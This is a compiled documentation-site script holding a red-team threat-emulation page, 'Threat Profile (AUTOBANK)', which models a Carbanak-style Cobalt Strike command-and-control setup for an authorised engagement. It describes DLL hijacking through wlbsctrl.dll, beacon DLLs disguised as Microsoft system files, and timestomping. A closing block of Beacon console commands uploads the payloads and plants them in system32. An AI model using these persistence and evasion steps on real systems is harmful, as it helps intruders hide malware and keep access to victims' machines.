"use strict";(self.webpackChunkbs_support=self.webpackChunkbs_support||[]).push([[954],{3905:(e,t,r)=>{r.d(t,{Zo:()=>c,kt:()=>m});var l=r(7294);function n(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function i(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);t&&(l=l.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,l)}return r}function a(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?i(Object(r),!0).forEach((function(t){n(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function o(e,t){if(null==e)return{};var r,l,n=function(e,t){if(null==e)return{};var r,l,n={},i=Object.keys(e);for(l=0;l<i.length;l++)r=i[l],t.indexOf(r)>=0||(n[r]=e[r]);return n}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(l=0;l<i.length;l++)r=i[l],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(n[r]=e[r])}return n}var s=l.createContext({}),p=function(e){var t=l.useContext(s),r=t;return e&&(r="function"==typeof e?e(t):a(a({},t),e)),r},c=function(e){var t=p(e.components);return l.createElement(s.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return l.createElement(l.Fragment,{},t)}},d=l.forwardRef((function(e,t){var r=e.components,n=e.mdxType,i=e.originalType,s=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),d=p(r),m=n,k=d["".concat(s,".").concat(m)]||d[m]||u[m]||i;return r?l.createElement(k,a(a({ref:t},c),{},{components:r})):l.createElement(k,a({ref:t},c))}));function m(e,t){var r=arguments,n=t&&t.mdxType;if("string"==typeof e||n){var i=r.length,a=new Array(i);a[0]=d;var o={};for(var s in t)hasOwnProperty.call(t,s)&&(o[s]=t[s]);o.originalType=e,o.mdxType="string"==typeof e?e:n,a[1]=o;for(var p=2;p<i;p++)a[p]=r[p];return l.createElement.apply(null,a)}return l.createElement.apply(null,r)}d.displayName="MDXCreateElement"},2394:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>s,contentTitle:()=>a,default:()=>u,frontMatter:()=>i,metadata:()=>o,toc:()=>p});var l=r(7462),n=(r(7294),r(3905));const i={id:"autobank",title:"Threat Profile - AUTOBANK",description:"AUTOBANK threat profile example\n"},a="Threat Profile (AUTOBANK)",o={unversionedId:"Threat Profiles/autobank",id:"Threat Profiles/autobank",title:"Threat Profile - AUTOBANK",description:"AUTOBANK threat profile example\n",source:"@site/docs/Threat Profiles/autobank.md",sourceDirName:"Threat Profiles",slug:"/Threat Profiles/autobank",permalink:"/docs/Threat Profiles/autobank",draft:!1,tags:[],version:"current",frontMatter:{id:"autobank",title:"Threat Profile - AUTOBANK",description:"AUTOBANK threat profile example\n"},sidebar:"tutorialSidebar",previous:{title:"ROE Template",permalink:"/docs/Templates/roe_template"},next:{title:"Threat Profile - BLUEHEART",permalink:"/docs/Threat Profiles/blueheart"}},s={},p=[{value:"Description",id:"description",level:2},{value:"Characteristics",id:"characteristics",level:2},{value:"System Modifications",id:"system-modifications",level:2},{value:"Files",id:"files",level:3},{value:"Registry",id:"registry",level:2},{value:"Window Service",id:"window-service",level:2},{value:"WMI",id:"wmi",level:2},{value:"Deployment Steps",id:"deployment-steps",level:2},{value:"Persistence Steps (via CobaltStrike Beacon Console)",id:"persistence-steps-via-cobaltstrike-beacon-console",level:2}],c={toc:p};function u(e){let{components:t,...r}=e;return(0,n.kt)("wrapper",(0,l.Z)({},c,r,{components:t,mdxType:"MDXLayout"}),(0,n.kt)("h1",{id:"threat-profile-autobank"},"Threat Profile (AUTOBANK)"),(0,n.kt)("admonition",{type:"tip"},(0,n.kt)("p",{parentName:"admonition"},"A modified version of this profile was used on an assumed breach engagement. This profile is provide as an example to show details that supported a real engagement. ")),(0,n.kt)("h2",{id:"description"},"Description"),(0,n.kt)("p",null,"C2 threat inspired by the Carbanak APT malware.  It uses DNS and HTTP for C2 communications."),(0,n.kt)("blockquote",null,(0,n.kt)("p",{parentName:"blockquote"},"Reference: ",(0,n.kt)("a",{parentName:"p",href:"http://krebsonsecurity.com/wp-content/uploads/2015/02/Carbanak_APT_eng.pdf"},"http://krebsonsecurity.com/wp-content/uploads/2015/02/Carbanak_APT_eng.pdf"))),(0,n.kt)("h2",{id:"characteristics"},"Characteristics"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"C2 Backend: CobaltStrike 3"),(0,n.kt)("li",{parentName:"ul"},"Port(s): 53, 445, 80 (DNS, SMB, HTTP)"),(0,n.kt)("li",{parentName:"ul"},"C2 communication using DNS, HTTPS and SMB Traffic"),(0,n.kt)("li",{parentName:"ul"},"IP communication using DNS hostnames")),(0,n.kt)("p",null,"Cobalt Strike HTTP Request Profile:"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},'UserAgent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/6.0)"'),(0,n.kt)("li",{parentName:"ul"},"GET: /favicon"),(0,n.kt)("li",{parentName:"ul"},"POST /token")),(0,n.kt)("h2",{id:"system-modifications"},"System Modifications"),(0,n.kt)("h3",{id:"files"},"Files"),(0,n.kt)("p",null,"HTTPS PAYLOAD: "),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"Hijacked DLL: ",(0,n.kt)("inlineCode",{parentName:"li"},"c:\\windows\\system32\\wlbsctrl.dll ")),(0,n.kt)("li",{parentName:"ul"},"HTTPS Beacon: ",(0,n.kt)("inlineCode",{parentName:"li"},"c:\\windows\\system32\\services.dll ")),(0,n.kt)("li",{parentName:"ul"},"SMB   Beacon: ",(0,n.kt)("inlineCode",{parentName:"li"},"c:\\windows\\system32\\services.dll "))),(0,n.kt)("p",null,"*NOTE: using the same dll name for each beacon type."),(0,n.kt)("p",null,"Binary modified using a resource hacker to look similar to other Windows files"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"File Description: Services"),(0,n.kt)("li",{parentName:"ul"},"File Version: 6.1.7601.17514"),(0,n.kt)("li",{parentName:"ul"},"Product Name: Internet Explorer"),(0,n.kt)("li",{parentName:"ul"},"Product Version: 6.1.7601.17514"),(0,n.kt)("li",{parentName:"ul"},"Copyright: (c) Microsoft Corporation. All rights reserved"),(0,n.kt)("li",{parentName:"ul"},"Date Modified: 7/13/2009 08:41:22 PM")),(0,n.kt)("h2",{id:"registry"},"Registry"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"None")),(0,n.kt)("h2",{id:"window-service"},"Window Service"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"None")),(0,n.kt)("h2",{id:"wmi"},"WMI"),(0,n.kt)("ul",null,(0,n.kt)("li",{parentName:"ul"},"None")),(0,n.kt)("hr",null),(0,n.kt)("h2",{id:"deployment-steps"},"Deployment Steps"),(0,n.kt)("ol",null,(0,n.kt)("li",{parentName:"ol"},"Create CobaltStrike C2 Profile"),(0,n.kt)("li",{parentName:"ol"},"Build payloads using profile"),(0,n.kt)("li",{parentName:"ol"},"build 32 bit DLL files - named services.dll"),(0,n.kt)("li",{parentName:"ol"},"Use a Resource Hacker utility to modify binaries to match File Attributes"),(0,n.kt)("li",{parentName:"ol"},"Deploy dlls to target system"),(0,n.kt)("li",{parentName:"ol"},"Verify time matches surrounding files (TimeStomp if needed)")),(0,n.kt)("h2",{id:"persistence-steps-via-cobaltstrike-beacon-console"},"Persistence Steps (via CobaltStrike Beacon Console)"),(0,n.kt)("pre",null,(0,n.kt)("code",{parentName:"pre"},'cd c:\\windows\\temp\nupload /data/5-PAYLOADS/wlbsctrl.dll\nupload /data/5-PAYLOADS/services1.dll (DNS Beacon)\nupload /data/5-PAYLOADS/services2.dll (SMB Beacon)\n\nshell mv services(1/2).dll services.dll\n\npowershell-import /data/PAYLOADS/Set-FileTimeStamps.ps1\npowershell Set-FileTimeStamps c:\\windows\\temp\\wlbsctrl.dll "7/13/2009 08:41:22 PM"\npowershell Set-FileTimeStamps c:\\windows\\temp\\services.dll "7/13/2009 08:41:22 PM"\n\nshell move c:\\windows\\temp\\wlbsctrl.dll c:\\windows\\system32\nshell move c:\\windows\\temp\\services.dll c:\\windows\\system32\n\n')))}u.isMDXComponent=!0}}]);